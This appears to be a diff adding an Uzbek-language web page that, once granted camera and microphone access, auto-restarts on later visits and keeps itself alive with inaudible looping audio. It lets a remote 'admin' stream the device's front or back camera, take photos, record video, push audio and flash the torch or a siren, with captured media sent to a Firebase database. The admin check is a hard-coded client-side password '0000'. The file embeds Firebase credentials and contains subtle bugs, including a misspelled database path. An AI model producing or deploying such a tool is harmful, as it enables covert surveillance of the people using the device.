@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👋🏿 HELLO</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.85);
+            --accent: #3b82f6;
+            --text: #f8fafc;
+            --danger: #ef4444;
+            --success: #22c55e;
+            --warning: #f59e0b;
+            --purple: #8b5cf6;
+            --teal: #14b8a6;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text); padding: 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .box { max-width: 700px; width: 100%; background: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
+        h2 { color: var(--accent); font-size: 1.1rem; margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 6px; }
+        .badge { background: rgba(59,130,246,0.2); border: 1px solid var(--accent); padding: 10px; border-radius: 6px; text-align: center; font-weight: bold; margin-bottom: 10px; }
+        
+        button { padding: 10px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 0.85rem; color: white; transition: 0.05s; }
+        button:active { transform: scale(0.96); }
+
+        .btn-green { background: var(--success); }
+        .btn-red { background: var(--danger); }
+        .btn-yellow { background: var(--warning); }
+        .btn-purple { background: var(--purple); }
+        .btn-teal { background: var(--teal); }
+        .btn-blue { background: var(--accent); width: 100%; }
+
+        textarea, input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; margin-bottom: 10px; }
+        textarea { height: 60px; resize: none; }
+        
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 8px; }
+        .card { background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 8px; margin-bottom: 12px; }
+        .video-box { width: 100%; height: 220px; background: #000; border-radius: 6px; overflow: hidden; margin-top: 8px; display: none; }
+        .video-box img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .media-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; margin-top: 10px; }
+        .media-item { background: rgba(255,255,255,0.05); padding: 4px; border-radius: 4px; text-align: center; }
+        .media-item img, .media-item video { width: 100%; height: 75px; object-fit: cover; border-radius: 4px; }
+        .media-actions { display: flex; gap: 4px; margin-top: 4px; }
+        .media-actions a, .media-actions button { flex: 1; font-size: 0.65rem; padding: 4px; text-align: center; text-decoration: none; border: none; border-radius: 3px; cursor: pointer; color: white; }
+    </style>
+</head>
+<body>
+
+    <!-- 1. QURILMA REJIMI -->
+    <div class="box">
+        <h2>Ushbu Qurilma Paneli</h2>
+        <div class="badge">ID: <span id="myId">Yuklanmoqda...</span></div>
+        <button class="btn-blue" onclick="initDevice()">Tizimni Fon Rejimida Ishga Tushirish</button>
+        <p id="statusText" style="font-size:0.8rem; color:#94a3b8; text-align:center; margin-top:6px;"></p>
+        
+        <video id="deviceVid" autoplay playsinline muted style="display:none;"></video>
+        <audio id="audioPlayer" controls style="width:100%; margin-top:10px; display:none;"></audio>
+
+        <h3 style="font-size: 0.9rem; margin-top: 12px; color: var(--teal);">Saqlangan Fayllar:</h3>
+        <div class="media-list" id="deviceGallery"></div>
+    </div>
+
+    <!-- 2. ADMIN KIRISH -->
+    <div class="box" id="loginBox">
+        <h2>Admin Rejimi (Parol: 0000)</h2>
+        <input type="password" id="passInput" placeholder="Parolni kiriting (0000)">
+        <button class="btn-blue" onclick="checkAdmin()">Kirish</button>
+    </div>
+
+    <!-- 3. ADMIN BOSHQARUV -->
+    <div class="box" id="adminBox" style="display:none;">
+        <h2>Boshqaruv Paneli</h2>
+        <textarea id="targetIds" placeholder="ID larni kiriting (masalan: DEV-1234)"></textarea>
+
+        <div class="grid">
+            <button class="btn-green" onclick="sendCmd('ON')">Yoqish</button>
+            <button class="btn-red" onclick="sendCmd('OFF')">Oʻchirish</button>
+            <button class="btn-yellow" onclick="sendCmd('BLINK')">Miltillatish</button>
+        </div>
+        <button class="btn-red" onclick="sendCmd('SIREN')" style="width:100%; margin-bottom:8px;">🚨 Sirena Yoqish</button>
+        <button class="btn-blue" onclick="loadAdminCards()">Kartalarni Yuklash</button>
+
+        <div id="cardsContainer" style="margin-top: 15px;"></div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeYCXyB6CTf7CUCtP7BzAIHbpIheFPFz8",
+            authDomain: "mening-jurnalim.firebaseapp.com",
+            databaseURL: "https://mening-jurnalim-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "mening-jurnalim",
+            storageBucket: "mening-jurnalim.appspot.com",
+            messagingSenderId: "341059328255",
+            appId: "1:341059328255:web:6f1f4ebfa36a9ec84714ca"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let deviceId = localStorage.getItem("dev_id");
+        if (!deviceId) {
+            deviceId = "DEV-" + Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem("dev_id", deviceId);
+        }
+        document.getElementById("myId").innerText = deviceId;
+
+        let activeStream = null;
+        let videoTrack = null;
+        let blinkTimer = null;
+        let frameInterval = null;
+        let mediaRecorder = null;
+        let recChunks = [];
+        let audioCtx = null;
+        let sirenOsc = null;
+        let silentAudioNode = null;
+
+        window.onload = () => {
+            if(localStorage.getItem("granted") === "true") initDevice();
+            loadLocalGallery();
+        };
+
+        async function initDevice() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' }, 
+                    audio: true 
+                });
+                videoTrack = stream.getVideoTracks()[0];
+                
+                localStorage.setItem("granted", "true");
+                document.getElementById("statusText").innerText = "Tizim fon rejimida faol. Ishlayveradi!";
+
+                // Brauzer fonda uxlab qolmasligi uchun ovozsiz audio oqimini yoqamiz
+                startSilentKeepAlive();
+
+                db.ref('devices/' + deviceId + '/state').on('value', snap => {
+                    executeInstantState(snap.val() || "OFF");
+                });
+
+                db.ref('devices/' + deviceId + '/streamSource').on('value', snap => setStreamSource(snap.val() || "NONE"));
+                db.ref('devices/' + deviceId + '/action').on('value', snap => handleAction(snap.val()));
+                
+                db.ref('devices/' + deviceId + '/audio').on('value', snap => {
+                    const audData = snap.val();
+                    if (audData) {
+                        const player = document.getElementById("audioPlayer");
+                        player.src = audData;
+                        player.play().catch(e => { player.style.display = "block"; });
+                    }
+                });
+            } catch(e) {
+                alert("Kamera yoki mikrofon ruxsati berilmadi: " + e.message);
+            }
+        }
+
+        // Brauzer fonda ishlashni to'xtatib qo'ymasligi uchun "Keep-Alive" texnologiyasi
+        function startSilentKeepAlive() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const buffer = audioCtx.createBuffer(1, audioCtx.sampleRate * 2, audioCtx.sampleRate);
+                const channelData = buffer.getChannelData(0);
+                for (let i = 0; i < buffer.length; i++) {
+                    channelData[i] = Math.random() * 0.000002; // Juda past shovqin (eshitilmaydi)
+                }
+                const source = audioCtx.createBufferSource();
+                source.buffer = buffer;
+                source.loop = true;
+                source.connect(audioCtx.destination);
+                source.start();
+            } catch(e) {}
+        }
+
+        function executeInstantState(state) {
+            clearInterval(blinkTimer);
+            stopSirenSound();
+
+            if (!videoTrack) return;
+
+            try {
+                const caps = videoTrack.getCapabilities();
+                if (!caps.torch) return;
+
+                if (state === "ON") {
+                    videoTrack.applyConstraints({ advanced: [{ torch: true }] });
+                } 
+                else if (state === "OFF") {
+                    videoTrack.applyConstraints({ advanced: [{ torch: false }] });
+                } 
+                else if (state === "BLINK") {
+                    let f = false;
+                    blinkTimer = setInterval(() => {
+                        f = !f;
+                        videoTrack.applyConstraints({ advanced: [{ torch: f }] });
+                    }, 150);
+                } 
+                else if (state === "SIREN") {
+                    let f = false;
+                    blinkTimer = setInterval(() => {
+                        f = !f;
+                        videoTrack.applyConstraints({ advanced: [{ torch: f }] });
+                    }, 150);
+                    startSirenSound();
+                }
+            } catch(err) {}
+        }
+
+        function startSirenSound() {
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                if (audioCtx.state === 'suspended') audioCtx.resume();
+                
+                sirenOsc = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                sirenOsc.type = 'sawtooth';
+                sirenOsc.frequency.setValueAtTime(500, audioCtx.currentTime);
+                
+                setInterval(() => {
+                    if(sirenOsc && audioCtx) {
+                        sirenOsc.frequency.setValueAtTime(800, audioCtx.currentTime);
+                        setTimeout(() => { if(sirenOsc) sirenOsc.frequency.setValueAtTime(400, audioCtx.currentTime); }, 200);
+                    }
+                }, 400);
+
+                sirenOsc.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                sirenOsc.start();
+            } catch(e) {}
+        }
+
+        function stopSirenSound() {
+            if (sirenOsc) {
+                try { sirenOsc.stop(); sirenOsc.disconnect(); } catch(e){}
+                sirenOsc = null;
+            }
+        }
+
+        async function setStreamSource(source) {
+            stopStream();
+            if (source === "NONE") return;
+
+            try {
+                if (source === "BACK") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
+                else if (source === "FRONT") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+
+                if (activeStream) {
+                    videoTrack = activeStream.getVideoTracks()[0];
+                    const vid = document.getElementById("deviceVid");
+                    vid.srcObject = activeStream;
+                    startSendingFrames();
+                }
+            } catch(err) {
+                db.ref('devices/' + deviceId + '/streamSource').set("NONE");
+            }
+        }
+
+        function stopStream() {
+            clearInterval(frameInterval);
+            if (activeStream) {
+                activeStream.getTracks().forEach(t => t.stop());
+                activeStream = null;
+            }
+            db.ref('devices/' + deviceId + '/frame').remove();
+        }
+
+        function startSendingFrames() {
+            const canvas = document.createElement("canvas");
+            const ctx = canvas.getContext("2d");
+            const vid = document.getElementById("deviceVid");
+
+            frameInterval = setInterval(() => {
+                if (vid.videoWidth > 0) {
+                    canvas.width = 300;
+                    canvas.height = (vid.videoHeight / vid.videoWidth) * 300;
+                    ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+                    db.ref('devices/' + deviceId + '/frame').set(canvas.toDataURL("image/jpeg", 0.4));
+                }
+            }, 200);
+        }
+
+        function handleAction(action) {
+            if (!action) return;
+            if (action === "PHOTO") takePhoto();
+            if (action === "START_REC") startRecording();
+            if (action === "STOP_REC") stopRecording();
+            db.ref('devices/' + deviceId + '/action').remove();
+        }
+
+        function takePhoto() {
+            const vid = document.getElementById("deviceVid");
+            if (!vid.videoWidth) return;
+            const canvas = document.createElement("canvas");
+            canvas.width = vid.videoWidth;
+            canvas.height = vid.videoHeight;
+            canvas.getContext("2d").drawImage(vid, 0, 0);
+            
+            const data = canvas.toDataURL("image/png");
+            saveMedia('photo', data);
+        }
+
+        function startRecording() {
+            if (!activeStream) return;
+            recChunks = [];
+            mediaRecorder = new MediaRecorder(activeStream);
+            mediaRecorder.ondataavailable = e => recChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => saveMedia('video', reader.result);
+            };
+            mediaRecorder.start();
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+        }
+
+        function saveMedia(type, data) {
+            db.ref('devices/' + deviceId + '/media').push({ type, data });
+            let local = JSON.parse(localStorage.getItem("my_media") || "[]");
+            local.push({ type, data });
+            localStorage.setItem("my_media", JSON.stringify(local));
+            loadLocalGallery();
+        }
+
+        function loadLocalGallery() {
+            const gallery = document.getElementById("deviceGallery");
+            let local = JSON.parse(localStorage.getItem("my_media") || "[]");
+            gallery.innerHTML = "";
+            local.forEach((item, idx) => {
+                gallery.innerHTML += `
+                    <div class="media-item">
+                        ${item.type === "photo" ? `<img src="${item.data}"/>` : `<video src="${item.data}" controls></video>`}
+                        <div class="media-actions">
+                            <a class="btn-teal" href="${item.data}" download>Saqlash</a>
+                            <button class="btn-red" onclick="deleteLocalMedia(${idx})">Oʻchirish</button>
+                        </div>
+                    </div>`;
+            });
+        }
+
+        function deleteLocalMedia(idx) {
+            let local = JSON.parse(localStorage.getItem("my_media") || "[]");
+            local.splice(idx, 1);
+            localStorage.setItem("my_media", JSON.stringify(local));
+            loadLocalGallery();
+        }
+
+        // --- ADMIN PANELI ---
+        function checkAdmin() {
+            if(document.getElementById("passInput").value === "0000") {
+                document.getElementById("loginBox").style.display = "none";
+                document.getElementById("adminBox").style.display = "block";
+            } else alert("Noto'g'ri parol!");
+        }
+
+        function sendCmd(mode) {
+            const ids = document.getElementById("targetIds").value.split(/[\n,]+/).map(i => i.trim()).filter(i => i);
+            const updates = {};
+            ids.forEach(id => updates['devices/' + id + '/state'] = mode);
+            db.ref().update(updates);
+        }
+
+        function loadAdminCards() {
+            const ids = document.getElementById("targetIds").value.split(/[\n,]+/).map(i => i.trim()).filter(i => i);
+            const container = document.getElementById("cardsContainer");
+            container.innerHTML = "";
+
+            ids.forEach(id => {
+                const card = document.createElement("div");
+                card.className = "card";
+                card.innerHTML = `
+                    <b>ID: ${id}</b>
+                    <div class="grid" style="margin-top:6px;">
+                        <button class="btn-green" onclick="db.ref('devices/${id}/state').set('ON')">ON</button>
+                        <button class="btn-red" onclick="db.ref('devices/${id}/state').set('OFF')">OFF</button>
+                        <button class="btn-yellow" onclick="db.ref('devices/${id}/state').set('BLINK')">Miltillash</button>
+                    </div>
+                    <button class="btn-red" onclick="db.ref('devices/${id}/state').set('SIREN')" style="width:100%; margin-bottom:6px;">🚨 Sirena Yoqish</button>
+
+                    <div class="grid">
+                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('BACK')">Orqa Kamera</button>
+                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('FRONT')">Oldi Kamera</button>
+                        <button class="btn-red" onclick="db.ref('devices/${id}/streamSource').set('NONE')">Yopish</button>
+                    </div>
+
+                    <div class="grid">
+                        <button class="btn-teal" onclick="db.ref('devices/${id}/action').set('PHOTO')">📸 Rasm</button>
+                        <button class="btn-teal" onclick="db.ref('devics/${id}/action').set('START_REC')">🔴 Yozish</button>
+                        <button class="btn-red" onclick="db.ref('devices/${id}/action').set('STOP_REC')">⏹ Toʻxtatish</button>
+                    </div>
+
+                    <button class="btn-teal" style="width:100%; margin-top:4px;" onmousedown="startSpeak('${id}')" onmouseup="stopSpeak('${id}')" ontouchstart="startSpeak('${id}')" ontouchend="stopSpeak('${id}')">🎙 Bosib Gapiring (Hold)</button>
+
+                    <div class="video-box" id="vBox-${id}"><img id="img-${id}"/></div>
+                    <div class="media-list" id="adminMedia-${id}"></div>
+                `;
+                container.appendChild(card);
+
+                db.ref('devices/' + id + '/frame').on('value', snap => {
+                    const box = document.getElementById(`vBox-${id}`);
+                    const img = document.getElementById(`img-${id}`);
+                    if (snap.val()) { box.style.display = "block"; img.src = snap.val(); }
+                    else box.style.display = "none";
+                });
+
+                db.ref('devices/' + id + '/media').on('value,', snap => {
+                    const gallery = document.getElementById(`adminMedia-${id}`);
+                    gallery.innerHTML = "";
+                    if (snap.val()) {
+                        Object.entries(snap.val()).forEach(([mKey, item]) => {
+                            gallery.innerHTML += `
+                                <div class="media-item">
+                                    ${item.type === "photo" ? `<img src="${item.data}"/>` : `<video src="${item.data}" controls></video>`}
+                                    <div class="media-actions">
+                                        <a class="btn-teal" href="${item.data}" download>Yuklash</a>
+                                        <button class="btn-red" onclick="db.ref('devices/${id}/media/${mKey}').remove()">Oʻchirish</button>
+                                    </div>
+                                </div>`;
+                        });
+                    }
+                });
+            });
+        }
+
+        let audioRec = null, audioChunks = [];
+        async function startSpeak(id) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audioRec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                audioChunks = [];
+                audioRec.ondataavailable = e => audioChunks.push(e.data);
+                audioRec.onstop = () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => db.ref('devices/' + id + '/audio').set(reader.result);
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                audioRec.start();
+            } catch(e) {}
+        }
+
+        function stopSpeak(id) {
+            if (audioRec && audioRec.state !== "inactive") audioRec.stop();
+        }
+    </script>
+</body>
+</html>
